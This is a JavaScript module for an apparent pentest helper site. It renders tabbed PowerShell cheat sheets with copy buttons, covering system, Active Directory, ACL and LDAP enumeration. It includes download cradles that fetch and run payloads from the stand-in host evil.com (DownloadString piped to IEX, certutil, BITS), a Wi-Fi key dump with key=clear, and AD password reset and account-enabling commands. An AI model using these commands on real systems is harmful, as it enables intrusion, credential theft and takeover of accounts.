const categories = {
  'System Enum': [
    { cmd: 'Get-WmiObject Win32_OperatingSystem | Select-Object Caption,Version,CSName' },
    { cmd: 'systeminfo' },
    { cmd: 'Get-WmiObject Win32_ComputerSystem' },
    { cmd: 'Get-WmiObject Win32_Processor' },
    { cmd: 'Get-WmiObject Win32_LogicalDisk' },
    { cmd: 'Get-Process' },
    { cmd: 'Get-Service' },
    { cmd: 'Get-WmiObject Win32_UserAccount' },
    { cmd: 'Get-LocalUser' },
    { cmd: 'Get-LocalGroup' },
    { cmd: 'Get-LocalGroupMember Administrators' },
    { cmd: 'whoami' },
    { cmd: 'whoami /all' },
  ],
  'Security Patches': [
    { cmd: 'Get-HotFix' },
    { cmd: 'Get-WmiObject Win32_QuickFixEngineering' },
    { cmd: 'systeminfo | findstr /C:"KB"' },
    { cmd: 'Get-HotFix | Select-Object HotFixID,InstalledOn' },
    { cmd: 'wmic qfe get Caption,Description,HotFixID,InstalledOn' },
  ],
  'Environment Vars': [
    { cmd: 'Get-ChildItem Env:' },
    { cmd: 'Get-ChildItem Env:PATH' },
    { cmd: 'Get-ChildItem Env:USERNAME' },
    { cmd: 'Get-ChildItem Env:COMPUTERNAME' },
    { cmd: '[Environment]::GetEnvironmentVariables()' },
    { cmd: 'dir env:' },
  ],
  'HTTP Download': [
    { cmd: '(New-Object Net.WebClient).DownloadFile("http://evil.com/payload.exe","C:\\Users\\Public\\payload.exe")' },
    { cmd: '(New-Object Net.WebClient).DownloadString("http://evil.com/script.ps1") | IEX' },
    { cmd: 'Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Users\\Public\\payload.exe' },
    { cmd: 'Invoke-WebRequest -Uri http://evil.com/script.ps1 -UseBasicParsing | Select -ExpandProperty Content' },
    { cmd: 'Start-BitsTransfer -Source http://evil.com/payload.exe -Destination C:\\Users\\Public\\payload.exe' },
    { cmd: 'certutil -urlcache -f http://evil.com/payload.exe payload.exe' },
  ],
  'WLAN Enum': [
    { cmd: 'netsh wlan show profiles' },
    { cmd: 'netsh wlan show profile name="SSID" key=clear' },
    { cmd: 'netsh wlan show drivers' },
    { cmd: 'netsh wlan show interfaces' },
    { cmd: 'netsh wlan show all' },
    { cmd: 'Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"' },
  ],
  'AD Enum': [
    { cmd: 'Get-ADDomain' },
    { cmd: 'Get-ADDomainController' },
    { cmd: 'Get-ADUser -Filter * -Properties *' },
    { cmd: 'Get-ADGroup -Filter * -Properties *' },
    { cmd: 'Get-ADGroupMember "Domain Admins"' },
    { cmd: 'Get-ADComputer -Filter * -Properties *' },
    { cmd: 'Get-ADOrganizationalUnit -Filter *' },
    { cmd: 'Get-ADForest' },
    { cmd: 'Get-ADObject -Filter {ObjectClass -eq "serviceConnectionPoint"}' },
  ],
  'GPO': [
    { cmd: 'Get-GPO -All' },
    { cmd: 'Get-GPOReport -All -ReportType HTML -Path report.html' },
    { cmd: 'Get-GPPermission -All' },
    { cmd: 'Get-GPResultantSetOfPolicy -ReportType HTML -Path gporeport.html' },
    { cmd: 'Get-GPResultantSetOfPolicy -Computer "computer" -User "user" -ReportType XML' },
    { cmd: 'rsop' },
  ],
  'Computers': [
    { cmd: 'Get-ADComputer -Filter * -Properties OperatingSystem,IPv4Address' },
    { cmd: 'Get-ADComputer -Filter * | Select Name' },
    { cmd: 'Get-ADComputer -Filter {OperatingSystem -Like "*Windows 10*"}' },
    { cmd: 'Get-ADComputer -Identity "COMPUTER01" -Properties *' },
    { cmd: 'net view' },
    { cmd: 'net view /domain' },
  ],
  'Admins': [
    { cmd: 'Get-ADGroupMember -Identity "Domain Admins" -Recursive' },
    { cmd: 'Get-ADGroupMember -Identity "Enterprise Admins" -Recursive' },
    { cmd: 'Get-ADGroupMember -Identity "Administrators" -Recursive' },
    { cmd: 'Get-ADPrincipalGroupMembership username' },
    { cmd: 'net localgroup Administrators' },
    { cmd: 'net group "Domain Admins" /domain' },
  ],
  'ACLs': [
    { cmd: 'Get-Acl -Path AD:\\\\Domain\\DN' },
    { cmd: 'Get-Acl "AD:CN=user,CN=Users,DC=domain,DC=com" | Format-List' },
    { cmd: 'Get-ADObject -Filter * -Properties NTSecurityDescriptor' },
    { cmd: 'dsacls "CN=user,CN=Users,DC=domain,DC=com"' },
    { cmd: 'Get-Acl HKLM:\\SAM\\SAM\\Domains\\Account\\Users' },
    { cmd: 'Get-Acl C:\\Windows\\System32' },
    { cmd: 'Get-Acl -Path C:\\ -Recurse | Where { $_.AccessToString -match "Everyone" }' },
  ],
  'LDAP Scripts': [
    { cmd: "([ADSI]'LDAP://domain.com/DC=domain,DC=com').Children" },
    { cmd: "([ADSI]'LDAP://domain.com/CN=Users,DC=domain,DC=com').Children" },
    { cmd: '$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://domain.com"); $searcher.Filter = "(&(objectClass=user))"; $searcher.FindAll()' },
    { cmd: '$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://domain.com"); $searcher.Filter = "(&(objectClass=group))"; $searcher.FindAll()' },
    { cmd: "Get-ADObject -LDAPFilter '(objectCategory=person)'" },
    { cmd: "Get-ADObject -LDAPFilter '(objectClass=user)'" },
    { cmd: "Get-ADObject -LDAPFilter '(adminCount=1)'" },
    { cmd: 'Set-ADAccountPassword -Identity user -Reset -NewPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)' },
    { cmd: 'Set-ADUser -Identity user -Enabled $true' },
  ],
};

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

export default function render(lang) {
  const isFa = lang === 'fa';
  const catNames = Object.keys(categories);
  return `
<div class="section-title">${isFa ? 'دستورات مفید پاورشل' : 'Useful PowerShell Commands'}</div>
<div class="tabs" id="ps-tabs">
  ${catNames.map((c, i) => `<button class="tab${i === 0 ? ' active' : ''}" data-tab="ps-${i}">${c}</button>`).join('')}
</div>
${catNames.map((c, i) => `
<div class="tab-pane${i === 0 ? ' active' : ''}" id="ps-${i}">
  ${categories[c].map(p => `
  <div class="panel" style="padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px">
    <pre style="flex:1;margin:0;overflow:auto;background:var(--bg-2);padding:10px;border-radius:var(--radius-sm)"><code>${escapeHtml(p.cmd)}</code></pre>
    <button class="secondary-btn" data-copy="${escapeHtml(p.cmd)}" style="flex-shrink:0">${isFa ? 'کپی' : 'Copy'}</button>
  </div>`).join('')}
</div>`).join('')}`;
}

export function init(lang) {
  const container = document.getElementById('content');
  container.addEventListener('click', (e) => {
    const btn = e.target.closest('.secondary-btn');
    if (btn && btn.hasAttribute('data-copy')) {
      navigator.clipboard.writeText(btn.getAttribute('data-copy'));
    }
    const tab = e.target.closest('.tab');
    if (tab && tab.closest('#ps-tabs')) {
      container.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      container.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      const pane = document.getElementById(tab.getAttribute('data-tab'));
      if (pane) pane.classList.add('active');
    }
  });
}
